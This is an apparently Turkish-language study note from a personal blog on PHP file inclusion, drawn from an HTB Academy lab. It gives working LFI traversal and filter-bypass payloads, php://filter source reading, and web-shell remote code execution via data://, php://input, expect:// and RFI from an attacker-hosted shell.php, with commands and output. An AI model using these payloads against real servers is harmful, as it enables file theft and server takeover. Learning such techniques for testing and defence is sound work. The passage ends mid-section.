@@ -1,0 +1,355 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>File Inclusion | fhk0</title><meta name="author" content="fhk0"><meta name="copyright" content="fhk0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Local File Inclusionhttp:&#x2F;&#x2F;&lt;SERVER_IP&gt;:&lt;PORT&gt;&#x2F;index.php?language&#x3D;es.php şeklinde bir yapı var diyelim. Burada language paratmetresi bir dosya şeklinde değer alıyor olabilir ki bu açığın ol">
+<meta property="og:type" content="article">
+<meta property="og:title" content="File Inclusion">
+<meta property="og:url" content="https://fhk0.github.io/2022/09/16/File-Inclusion/index.html">
+<meta property="og:site_name" content="fhk0">
+<meta property="og:description" content="Local File Inclusionhttp:&#x2F;&#x2F;&lt;SERVER_IP&gt;:&lt;PORT&gt;&#x2F;index.php?language&#x3D;es.php şeklinde bir yapı var diyelim. Burada language paratmetresi bir dosya şeklinde değer alıyor olabilir ki bu açığın ol">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://fhk0.github.io/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/fileinclusion.jpg">
+<meta property="article:published_time" content="2022-09-16T05:24:50.000Z">
+<meta property="article:modified_time" content="2022-09-16T06:18:20.974Z">
+<meta property="article:author" content="fhk0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fhk0.github.io/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/fileinclusion.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://fhk0.github.io/2022/09/16/File-Inclusion/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'File Inclusion',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-09-16 09:18:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.2.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/mrrobot.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">18</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fa-solid fa-circle-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/fileinclusion.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">fhk0</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/whoami/"><i class="fa-fw fa-solid fa-circle-user"></i><span> About</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">File Inclusion</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2022-09-16T05:24:50.000Z" title="Created 2022-09-16 08:24:50">2022-09-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2022-09-16T06:18:20.974Z" title="Updated 2022-09-16 09:18:20">2022-09-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Academy/">HTB Academy</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/HTB-Academy/Bug-Bounty-Hunter/">Bug Bounty Hunter</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="File Inclusion"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Local-File-Inclusion"><a href="#Local-File-Inclusion" class="headerlink" title="Local File Inclusion"></a>Local File Inclusion</h1><p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=es.php</code> şeklinde bir yapı var diyelim. Burada language paratmetresi bir dosya şeklinde değer alıyor olabilir ki bu açığın oluşması için böyle bir durum söz konusu olmak durumunda. Örneğin bu <code>es.php</code> değerini değiştirip <code>en.php</code> yapabiliyorsak o zaman gidip dizindeki en.php dosyasını önümüze getirmektedir. Buradan mantıkla biz sistem içerisindeki dosyaları okuyabiliriz.</p>
+<p>Örneğin <code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/etc/passwd</code> şeklindeki kullanımla language parametresine girdiğimiz dosya ismiyle okuma gerçekleştirebiliriz:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled.png" alt="Untitled"></p>
+<p>Eğer dosyaya direkt erişemiyorsan <strong>path traversal</strong> yöntemi ile bunu gerçekleştirebilirsin. Bu seferde language parametresine <code>../../../../etc/passwd</code> şeklinde root’tan referans alan bir değer girerek tüm dizini belirtmiş olursun. <code>../</code> belirtimini kullanırken en az sayıda kullanmaya çalışmak önemlidir çünkü parametre değerini bu belirtimle doldurursan istediğin dizine ulaşamazsın. Bazen bu belirtimin başına <code>/</code> eklemen gerekebilir yani <code>/../../../../etc/passwd</code> şeklinde bir kullanım da söz konusu olabilir. </p>
+<p>Şimdi bir flag okuyalım:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%201.png" alt="Untitled"></p>
+<h1 id="Bypass-Yontemleri"><a href="#Bypass-Yontemleri" class="headerlink" title="Bypass Yöntemleri"></a>Bypass Yöntemleri</h1><h2 id="Non-Recursive-Path-Traversal-Filters"><a href="#Non-Recursive-Path-Traversal-Filters" class="headerlink" title="Non-Recursive Path Traversal Filters"></a><strong><strong>Non-Recursive Path Traversal Filters</strong></strong></h2><p>Diyelim ki uygulamada <code>../</code> eklememizi engelleyen bir filtre var. Şu şekilde bir kod olsun:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$language</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;../&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;language&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>Burayı nasıl aşabiliriz? Biz her <code>../</code> eklemeye çalıştığımızda bunu alıp siliyor ve karşımıza böyle bir tablo çıkıyor:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%202.png" alt="Untitled"></p>
+<p>Bu arkadaş recursive değil bir kere. Yani bu kod <code>../</code> görüp siliyor ve bitiyor. Peki sildiğinde yine aynı şey ortaya çıkarsa onu da silecek mi? Hayır. O zaman dizinimizi buna göre ayarlayalım: <code>....//....//....//....//etc/passwd</code> </p>
+<p>Bu şekilde <code>../</code> silindikten sonra geriye <code>../../../../etc/passwd</code> kalmış olacak. Eğer recursive bir koruma olsaydı o zaman dönen sonuç da tekrar kontrol edilirdi ve böyle bir durum olmazdı.</p>
+<p>Bu doğrultuda benzer olarak başka payload’lar da denenebilir. Örneğin <code>..././</code> ya da <code>....\/</code> ya da <code>....////</code> şeklinde farklı kullanımlar da denenebilir.</p>
+<h2 id="Encoding"><a href="#Encoding" class="headerlink" title="Encoding"></a>Encoding</h2><p>URL encode kullanarak filtreyi atlatmayı deneyebiliriz. Burada dikkat edilmesi gereken nokta işaretlerinin de encode’a dahil edilmesi gerektiğidir. </p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%203.png" alt="Untitled"></p>
+<h2 id="Approved-Paths"><a href="#Approved-Paths" class="headerlink" title="Approved Paths"></a><strong><strong>Approved Paths</strong></strong></h2><p><code>language=./languages/../../../../etc/passwd</code> şeklinde bir kullanım da söz konusu olabilir. İlgilendiğin dizin languages şeklindeki belirli bir dizin altında bulunuyorsa bunu belirtmen için gereken bir filtre söz konusu olabilir. </p>
+<h2 id="Path-Truncation"><a href="#Path-Truncation" class="headerlink" title="Path Truncation"></a><strong><strong>Path Truncation</strong></strong></h2><p>PHP’nin eski versiyonlarında dizin kısaltan bir fonksiyon mevcuttu yani <code>////etc/passwd</code> şeklindeki bir yazım otomatik olarak <code>/etc/passwd</code> şekline çeviriliyordu. Yani gereksizler göz ardı edilir. Örneğin <code>/etc/./passwd</code> şeklindeki kullanımda ortadaki <code>.</code> işareti göz ardı edilir ya da <code>/etc/passwd/.</code> kullanımında sondaki <code>/.</code> kısmı göz ardı edilir.</p>
+<p>4096 karaktere sınırına ulaştığımızda bu göz ardı etme devreye girer. Niyeee? Çünkü 32 bit keke. Ayrıca unutmadan belirtelim ki bu tekniğin çalışması için dizinin en başına hali hazırda var olmayan bir dizinin eklenmesi gerekir. Örnek verelim:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~<span class="number">2048</span> times]</span><br></pre></td></tr></table></figure>
+
+<p>2048 defa ben <code>./</code> yazamayacağıma göre bunu otomatize edelim. Bash iş başına:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n <span class="string">&quot;non_existing_directory/../../../etc/passwd/&quot;</span> &amp;&amp; <span class="keyword">for</span> i <span class="keyword">in</span> &#123;1..2048&#125;; <span class="keyword">do</span> <span class="built_in">echo</span> -n <span class="string">&quot;./&quot;</span>; <span class="keyword">done</span></span><br><span class="line"></span><br><span class="line">non_existing_directory/../../../etc/passwd/./././&lt;SNIP&gt;././././</span><br></pre></td></tr></table></figure>
+
+<h2 id="Null-Bytes"><a href="#Null-Bytes" class="headerlink" title="Null Bytes"></a>Null Bytes</h2><p>Null byte (<code>%00</code>) injection söz konusudur. Dizenin sonuna boş bir bayt (<code>%00</code>) eklemek, dizeyi sonlandıracak ve ondan sonraki hiçbir şeyi dikkate almayacaktır. Örneğin <code>/etc/passwd%00</code> şeklindeki bir kullanım ile bu sağlanabilir.</p>
+<hr>
+<h1 id="PHP-Filters"><a href="#PHP-Filters" class="headerlink" title="PHP Filters"></a>PHP Filters</h1><p>XXE saldırısında kullandığımız PHP filtrelerini burada da kullanacağız. PHP şemasını <code>php://</code> ile belirtiriz ve filtreleme için <code>php://filter/</code> şeklinde bir belirtim yaparız.</p>
+<p>There are four different types of filters available for use, which are <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.string.php">String Filters</a>, <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.convert.php">Conversion Filters</a>, <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.compression.php">Compression Filters</a>, and <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/filters.encryption.php">Encryption Filters</a>. You can read more about each filter on their respective link, but the filter that is useful for LFI attacks is the <code>convert.base64-encode</code> filter, under <code>Conversion Filters</code>.</p>
+<p>Conversion filtresi basitçe base64’e çevrim şeklinde düşünebiliriz. İçeriğini okumak istediğin dosyayı base64’e çevirip sonrasında bunu tekrardan decode etme olayıdır.</p>
+<p>Önce bir sayfa fuzz’laması yaparsın:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/FUZZ.php</span><br></pre></td></tr></table></figure>
+
+<div class="note info flat"><p>🌐 <strong>Not:</strong> Burada dikkat edilmesi gereken illa ki kendimizi 200 OK response kodu ile sınırlamamamız gerektiğidir. 301, 302 ve 403 hata mesajlarını içeren sayfaların da kodlarını okuyabiliriz. Unutma bu sayfalar yok değiller. Sadece bir şekilde erişimleri kısıtlı o kadar.</p>
+</div>
+
+<p>Diyelim ki config adında bir dosya bulduk ve içindeki bir şeyi göremiyoruz. O zaman language parametresine ekleme yapalım ve bu php filtresini kullanarak okumaya çalışalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=config</span><br></pre></td></tr></table></figure>
+
+<p>Sonuç:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%204.png" alt="Untitled"></p>
+<p>Yukarıdaki gibi base64 çıktısı elde ettik. Bu çıktıyı çözümlersek php koduna erişebiliriz. Bu kadar.</p>
+<hr>
+<p><strong>Ufak Vaka Çalışması:</strong></p>
+<p>Adım 1:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%205.png" alt="Untitled"></p>
+<p>Adım 2:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%206.png" alt="Untitled"></p>
+<p>Adım 3:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%207.png" alt="Untitled"></p>
+<p>Adım 4:</p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%208.png" alt="Untitled"></p>
+<hr>
+<h1 id="Remote-Code-Execution"><a href="#Remote-Code-Execution" class="headerlink" title="Remote Code Execution"></a>Remote Code Execution</h1><h2 id="PHP-Wrappers"><a href="#PHP-Wrappers" class="headerlink" title="PHP Wrappers"></a>PHP Wrappers</h2><p>Data wrapper ile php kodu çekebiliriz. Bunun için <code>allow_url_include</code> değerinin sistemde aktif edilmiş olması lazımdır. O zaman bu değerin sistemde aktif mi değil mi olduğunu kontrol etmemiz gerekir. Apache için <code>/etc/php/X.Y/apache2/php.ini</code>, Nginx için <code>/etc/php/X.Y/fpm/php.ini</code> dizinlerinde ayar dosyaları bulunur. Bu dizin üzerindeki <code>X.Y</code> belirtimi kullandığın PHP versiyonunu belirtir. </p>
+<p>PHP için sürüm 7.4 değerini belirtelim ve base64 ile şifreleyelim:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>Ahanda şöyle bir sonuç elde ederiz:</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">...SNIP...</span><br><span class="line"> <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Containers<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    W1BIUF0KCjs7Ozs7Ozs7O</span><br><span class="line">    ...SNIP...</span><br><span class="line">    4KO2ZmaS5wcmVsb2FkPQo=</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;read-more&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Çıkan değer içerisindeki değeri base64 tabanında decode edelim ve grep’leyip boolean değerini öğrenelim:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#x27;</span> | <span class="built_in">base64</span> -d | grep allow_url_include</span><br><span class="line"></span><br><span class="line">allow_url_include = On</span><br></pre></td></tr></table></figure>
+
+<p>Yes beybi! Değerimiz <strong>On</strong> olduğuna göre bu değer aktif demektir yani biz data wrapper kullanabiliriz. Varsayılan olarak bu değer deaktif haldedir. Bu değerin aktif olması bize birçok LFI ve RFI ataklarına olanak sağlar. </p>
+<p><strong>Şimdi RCE adımına geçelim.</strong></p>
+<p>Unutma: <code>Data wrapper can be used to include external data, including PHP code.</code> Şimdi şak şak php kodlarını geçireceğiz. Basit bir web shell denemesi yapalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line"></span><br><span class="line">PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi data wrapper kullanımına geçeceğiz. Data wrapper’ın base64 belirtimiyle (<code>data://text/plain;base64</code>) işlemi gerçekleştirelim. Finally, we can use pass commands to the web shell with <code>&amp;cmd=&lt;COMMAND&gt;</code>:</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%209.png" alt="Untitled"></p>
+<p>id değerini döndürmüş olduk.</p>
+<p>Aynı işlemi gerçekleştirmek için cURL da kullanılabilir:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&#x27;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id&#x27;</span> | grep uid            </span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Input-Wrapper"><a href="#Input-Wrapper" class="headerlink" title="Input Wrapper"></a>Input Wrapper</h3><p>Data wrapper’a benzer şekilde input wrapper dışarıdaki inputu bünyesinde barındırabilir ve php kodu çalıştırabilir. Çalışması için <code>POST</code> request verisi gerekir ve <code>allow_url_include</code> ayarının aktif olması gerekir.</p>
+<p><code>input</code> wrapper ile saldırımızı tekrarlamak için, kurban URL’ye bir POST isteği gönderebilir ve web shell’imizi POST verisi olarak ekleyebiliriz. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s -X POST --data <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> <span class="string">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=php://input&amp;cmd=id&quot;</span> | grep uid            </span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<div class="note info flat"><p>🌐 <strong>Note:</strong> To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. use $_REQUEST). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. &lt;?php system(‘id’)?&gt;)</p>
+</div>
+
+<h3 id="Expect-Wrapper"><a href="#Expect-Wrapper" class="headerlink" title="Expect Wrapper"></a>Expect Wrapper</h3><p>Bu modülün kendisi bir web shell gibi çalışır. Sistemde yüklü ve aktif olmalıdır. Önce bunun kontrolünü yapalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=&#x27;</span> | <span class="built_in">base64</span> -d | grep expect</span><br><span class="line"></span><br><span class="line">extension=expect</span><br></pre></td></tr></table></figure>
+
+<p>Extension ayar sözcüğünün değeri except olduğuna göre bu durumdan faydalanabiliriz demektir. O zaman <code>expect://</code> wrapper’ını kullanalım ve kullanmak istediğimiz komutu yanına yazalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -s <span class="string">&quot;http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=expect://id&quot;</span></span><br><span class="line"></span><br><span class="line">uid=33(www-data) gid=33(www-data) <span class="built_in">groups</span>=33(www-data)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Remote-File-Inclusion-RFI"><a href="#Remote-File-Inclusion-RFI" class="headerlink" title="Remote File Inclusion (RFI)"></a><strong><strong>Remote File Inclusion (RFI)</strong></strong></h2><p>RFI varlığını ölçmenin ilk adımı LFI ‘yı ölçerken yaptığımız gibi <code>allow_url_include = On</code> seçeneğinin ne durumda olduğunu belirlemektir. Ancak bu seçeneğin her zaman aktif edilmiş olması bizim yine de RFI yapabileceğimiz anlamına gelmez. Bunun için bir sonraki aşama o parametrenin local bir URL kabul edip etmediğini belirlemektir. Örneğin <code>language=http://127.0.0.1:80/index.php</code> parametreye bu şekilde lokal bir dosya gönderdik ve bu dosya zaten index.php’nin kendisidir. </p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2010.png" alt="Untitled"></p>
+<p>Sayfanın içinde sayfa oluştu yani index.php sayfasını blok içerisinde görüntüledik. Bu sonuçla RFI açıklığının olduğu kanaatine varabiliriz.</p>
+<h2 id="Remote-Code-Execution-with-RFI"><a href="#Remote-Code-Execution-with-RFI" class="headerlink" title="Remote Code Execution with RFI"></a><strong><strong>Remote Code Execution with RFI</strong></strong></h2><p>Öncelikle bir web shell oluşturalım:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span> &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>HTTP:</strong> Basit bir python serveri oluşturalım.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 -m http.server &lt;LISTENING_PORT&gt;</span><br><span class="line"></span><br><span class="line">Serving HTTP on 0.0.0.0 port &lt;LISTENING_PORT&gt; (http://0.0.0.0:&lt;LISTENING_PORT&gt;/) ...</span><br></pre></td></tr></table></figure>
+
+<p>Şimdi shell’imizi zafiyetli parametre üzerinden dahil edelim:</p>
+<p><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=http://&lt;OUR_IP&gt;:&lt;LISTENING_PORT&gt;/shell.php&amp;cmd=id</code></p>
+<p><img src="/img/content-images/htb-academy/File%20Inclusion%208f6288f536a34481ace1a36b0405116f/Untitled%2011.png" alt="Untitled"></p>
+<p>Shell’imizin enjekte edildiğini terminale gelen şu mesajla da doğrulayabiliriz:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERVER_IP - - [SNIP] <span class="string">&quot;GET /shell.php HTTP/1.0&quot;</span> 200 -</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p><strong>FTP:</strong> <code>pyftpdlib</code> ****kullanarak shell’imizi ftp protokolünden servis edelim.</p>
